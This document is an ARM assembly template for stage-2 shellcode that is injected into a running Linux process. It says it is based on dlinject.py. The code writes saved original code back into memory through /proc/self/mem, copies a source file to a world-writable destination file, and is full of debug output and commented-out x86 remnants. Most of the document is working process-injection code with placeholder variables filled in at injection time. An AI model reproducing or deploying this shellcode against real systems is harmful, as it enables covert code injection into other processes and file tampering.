b _start

.globl _start
_start:

// Based on the stage 2 code included with dlinject.py
// no relative offsets required, because everything is done using syscalls
//cld

// 32-bit ARM's ldr instruction can only refer to data that starts relatively close to the instruction
// So this code is interleaved with data
	adr r6, dmsg2
	//begin: debug
	mov r7, #4          @ SYS_WRITE
	mov r0, #1          @ fd = stdout
	mov r1, r6    		@ buf
	mov r2, #1   		@ count
	swi 0x0				@ syscall
	add r6, r6, #1		@ Increment debug string counter
	//end: debug
	
	b openProcSelfMem
	
dmsg2:
	.ascii "ZYXWVUTSRQPONMLKJIHGFEDCBA9876543210\0"
	.balign 8

//moar_regs:
//	.space 512
//	.balign 8
	
	//fxsave moar_regs[rip]
//	.ltorg

proc_self_mem:
	.ascii "/proc/self/mem\0"
	.balign 8

openProcSelfMem:
	//begin: debug
	mov r7, #4          @ SYS_WRITE
	mov r0, #1          @ fd = stdout
	mov r1, r6    		@ buf
	mov r2, #1   		@ count
	swi 0x0				@ syscall
	add r6, r6, #1		@ Increment debug string counter
	//end: debug

	// Open /proc/self/mem
	mov r7, #5				@ SYS_OPEN
	ldr r1, =proc_self_mem
	ldr r0, [r1]			@ path
	mov r1, #2       		@ flags (O_RDONLY)
	mov r2, #0        		@ mode
	swi 0x0					@ syscall
	mov r11, r0        		@ save the fd for later
	.ltorg
	
	b restoreCode

restoreCode:

	//begin: debug
	mov r7, #4          @ SYS_WRITE
	mov r0, #1          @ fd = stdout
	mov r1, r6    		@ buf
	mov r2, #1   		@ count
	swi 0x0				@ syscall
	add r6, r6, #1		@ Increment debug string counter
	//end: debug

	// seek to code
	mov r7, #19      					@ SYS_LSEEK
	mov r0, r11    						@ fd
	ldr r1, =[VARIABLE:RIP:VARIABLE]  	@ offset
	mov r2, #0    						@ whence (SEEK_SET)
	swi 0x0								@ syscall

	//begin: debug
	mov r7, #4          @ SYS_WRITE
	mov r0, #1          @ fd = stdout
	mov r1, r6    		@ buf
	mov r2, #1   		@ count
	swi 0x0				@ syscall
	add r6, r6, #1		@ Increment debug string counter
	//end: debug
	
	// restore code
	mov r7, #4                   					@ SYS_WRITE
	mov r0, r11                 					@ fd
	adr r1, old_code       							@ buf
	ldr r2, =[VARIABLE:LEN_CODE_BACKUP:VARIABLE]   	@ count
	swi 0x0											@ syscall

	// close /proc/self/mem
	mov r7, #6			@ SYS_CLOSE
	mov r0, r11  		@ fd
	swi 0x0				@ syscall
	.ltorg
	
	//begin: debug
	mov r7, #4          @ SYS_WRITE
	mov r0, #1          @ fd = stdout
	mov r1, r6    		@ buf
	mov r2, #1   		@ count
	swi 0x0				@ syscall
	add r6, r6, #1		@ Increment debug string counter
	//end: debug
	
	b moveToNewStack

old_code:
	.byte [VARIABLE:CODE_BACKUP_JOIN:VARIABLE]
	.balign 8

restoreStack:

	//begin: debug
	mov r7, #4          @ SYS_WRITE
	mov r0, #1          @ fd = stdout
	mov r1, r6    		@ buf
	mov r2, #1   		@ count
	swi 0x0				@ syscall
	add r6, r6, #1		@ Increment debug string counter
	//end: debug
	
	// restore original stack
	//mov rdi, [VARIABLE:RSP_MINUS_STACK_BACKUP_SIZE:VARIABLE]
	//lea rsi, old_stack[rip]
	//mov rcx, [VARIABLE:STACK_BACKUP_SIZE:VARIABLE]
	//rep movsb

	//lea rsp, new_stack_base[rip-[VARIABLE:STACK_BACKUP_SIZE:VARIABLE]]

	b shellCode

old_stack:
	.byte [VARIABLE:STACK_BACKUP_JOIN:VARIABLE]
	.balign 8
	
shellCode:
	.balign 8
	
	//begin: debug
	mov r7, #4          @ SYS_WRITE
	mov r0, #1          @ fd = stdout
	mov r1, r6    		@ buf
	mov r2, #1   		@ count
	swi 0x0				@ syscall
	add r6, r6, #1		@ Increment debug string counter
	//end: debug
	
	// using GCC's own =relative_reference magic doesn't work when injecting the shellcode
	// so I rolled my own using this spaghetti code trick that's straight out of the early 80s
	// the branch instruction in this code is 4 bytes long, so I stash the string immediately after it
	// then I know that it will be 4 bytes after the program counter when it hits that line, 
	// which is exactly what the pc register will be set to
	mov r8, pc
	b openSourceFile

sourcefile:
	.ascii "[VARIABLE:sourcefile:VARIABLE]\0"
	.balign 8

openSourceFile:
	// Open source file
	mov r7, #5			@ SYS_OPEN
	//ldr r1, =sourcefile
	//ldr r0, [r1]		@ path
	//ldr r0, =sourcefile
	mov r0, r8
	mov r1, #0       	@ flags (O_RDONLY)
	mov r2, #0        	@ mode
	swi 0x0				@ syscall
	mov r11, r0        	@ source fd
	
	//begin: debug
	mov r7, #4          @ SYS_WRITE
	mov r0, #1          @ fd = stdout
	#ldr r1, =sourcefile    		@ buf
	mov r1, r8    		@ buf
	mov r2, #6   		@ count
	swi 0x0				@ syscall
	//end: debug
	
	//begin: debug
	mov r7, #4          @ SYS_WRITE
	mov r0, #1          @ fd = stdout
	mov r1, r6    		@ buf
	mov r2, #1   		@ count
	swi 0x0				@ syscall
	add r6, r6, #1		@ Increment debug string counter
	//end: debug
	mov r12, pc
	b openDestFile
destfile:
	.ascii "[VARIABLE:destfile:VARIABLE]\0"
	.balign 8
	
openDestFile:
	// Open destination file
	mov r7, #5			@ SYS_OPEN
	//ldr r1, =destfile
	//ldr r0, [r1]		@ path
	//ldr r0, =destfile
	mov r0, r12
	mov r1, #0x42       @ flags (O_RDWR | O_CREAT)
	mov r2, #1			@ mode:  make destination world-writable
	mov r2, r2, lsl #8	@ Can't mov 0777 / 0x1ff as an immediate into a register on ARM
	add r2, r2, #0xff  
	swi 0x0				@ syscall
	mov r10, r0        	@ dest fd
	
	//begin: debug
	mov r7, #4          @ SYS_WRITE
	mov r0, #1          @ fd = stdout
	//ldr r1, =destfile    		@ buf
	mov r1, r12    		@ buf
	mov r2, #6   		@ count
	swi 0x0				@ syscall
	//end: debug
	
	//begin: debug
	mov r7, #4          @ SYS_WRITE
	mov r0, #1          @ fd = stdout
	mov r1, r6    		@ buf
	mov r2, #1   		@ count
	swi 0x0				@ syscall
	add r6, r6, #1		@ Increment debug string counter
	//end: debug
	
	.ltorg
//	b beginCopy

// beginCopy:
	//begin: debug
	mov r7, #4          @ SYS_WRITE
	mov r0, #1          @ fd = stdout
	mov r1, r6    		@ buf
	mov r2, #1   		@ count
	swi 0x0				@ syscall
	add r6, r6, #1		@ Increment debug string counter
	//end: debug


	// create a stack variable to use as a copy buffer
	// instead of using a variable defined in this file, because that would result in writing to executable memory
	sub sp,sp,#0x10
	mov r9, #0
	str r9, [sp, #0x8]
	mov r9, sp
	//sub r9, r9, #0x08

copyByteLoop:
	
	// read a single byte at a time to avoid more complex logic
	mov r7, #3			@ SYS_READ
	mov r0, r11			@ fd
	mov r1, r9       	@ buffer
	mov r2, #1        	@ number of bytes to read
	swi 0x0				@ syscall

	// if no char was read (usually end-of-file), processing is complete
	cmp r0, #1        	@ result of read operation
	blt doneCopying
	
	//begin: debug: echo current character
	mov r7, #4          @ SYS_WRITE
	mov r0, #1          @ fd = stdout
	mov r1, r9    		@ buf
	mov r2, #1   		@ count
	swi 0x0				@ syscall
	//end: debug
	
	// write the byte to the destination file
	mov r7, #4			@ SYS_WRITE   
	mov r0, r10			@ fd
	mov r1, r9       	@ buffer
	mov r2, #1        	@ number of bytes to write
	swi 0x0				@ syscall

	b copyByteLoop

doneCopying:

	//begin: debug
	mov r7, #4          @ SYS_WRITE
	mov r0, #1          @ fd = stdout
	mov r1, r6    		@ buf
	mov r2, #1   		@ count
	swi 0x0				@ syscall
	add r6, r6, #1		@ Increment debug string counter
	//end: debug
	
	// discard the buffer stack variable
	add sp,sp,#0x10

	// close file handles
	mov r7, #6			@ SYS_CLOSE
	mov r0, r11  		@ fd
	swi 0x0				@ syscall
	
	mov r7, #6			@ SYS_CLOSE
	mov r0, r10			@ fd
	swi 0x0				@ syscall
	
	//begin: debug
	mov r7, #4          @ SYS_WRITE
	mov r0, #1          @ fd = stdout
	mov r1, r6    		@ buf
	mov r2, #1   		@ count
	swi 0x0				@ syscall
	add r6, r6, #1		@ Increment debug string counter
	//end: debug
	
	// exit for now
	mov r7, #1			@ SYS_EXIT
	mov r0, #0  		@ return code
	swi 0x0				@ syscall
	
	// restore registers?

	// mov rsp, [VARIABLE:RSP:VARIABLE]
	
	// b [old_rip]

old_rip:
	.word [VARIABLE:RIP:VARIABLE]
	.balign 8

format_string:
	.ascii "DEBUG: %s\n\0"
	.balign 8
	
//This section is out of order because it refers to the new_stack_base variable that has to be at the end

moveToNewStack:
.balign 8
// move pushed regs to our new stack
//lea rdi, new_stack_base[rip-[VARIABLE:STACK_BACKUP_SIZE:VARIABLE]]
//mov rsi, [VARIABLE:RSP_MINUS_STACK_BACKUP_SIZE:VARIABLE]
//mov rcx, [VARIABLE:STACK_BACKUP_SIZE:VARIABLE]
//rep movsb

//begin: debug
mov r7, #4          @ SYS_WRITE
mov r0, #1          @ fd = stdout
mov r1, r6    		@ buf
mov r2, #1   		@ count
swi 0x0				@ syscall
add r6, r6, #1		@ Increment debug string counter
//end: debug

b restoreStack

new_stack:
	.balign 0x8000

new_stack_base:

